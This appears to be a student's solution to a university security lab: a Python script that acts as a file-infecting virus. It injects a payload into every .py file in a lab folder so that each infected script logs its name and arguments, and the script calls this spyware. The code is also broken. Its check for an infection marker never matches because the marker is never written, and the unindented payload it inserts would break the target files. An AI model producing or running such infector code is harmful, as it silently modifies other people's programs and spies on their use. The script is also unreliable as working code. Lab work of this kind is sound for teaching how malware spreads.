import os
import sys

# Going into LabGen to find the files
os.chdir('/home/cse/Lab2/LabGen')

files = os.listdir('.')  # List of all files in the directory

payload = [
    "\nimport sys\n",
    "filename = sys.argv[0]\n",
    "with open('Q1C.out', 'a') as log:\n",
    "    log.write(f'{filename} was executed with arguments: {' '.join(sys.argv[1:])}\\n')\n"
]

target = []

# Target all .py files in the directory
for f in files:
    if f.endswith('.py'):
        target.append(f)

# Infect each target file
for f in target:
    with open(f, "r") as file:
        lines = file.readlines()

    # Check if the file is already infected by looking for the marker
    already_infected = any("INFECTION MARKER" in line for line in lines)

    if not already_infected:
        # Find where to insert the payload (after if __name__ == "__main__":)
        for i, line in enumerate(lines):
            if 'if __name__ == "__main__":' in line:
                lines.insert(i + 1, "".join(payload))  # Insert payload right after
        
        # Rewrite the file with the modified content
        with open(f, "w") as file:
            file.writelines(lines)
        
        # Log the infection event
        with open("Q1C.out", "a") as log:
            log.write(f"{f} has been infected with spyware.\n")

        print(f"{f} has been infected with spyware.")
    else:
        print(f"{f} is already infected.")

# Changes back to Solutions for it to be stored here
os.chdir('/home/cse/Lab2/Solutions')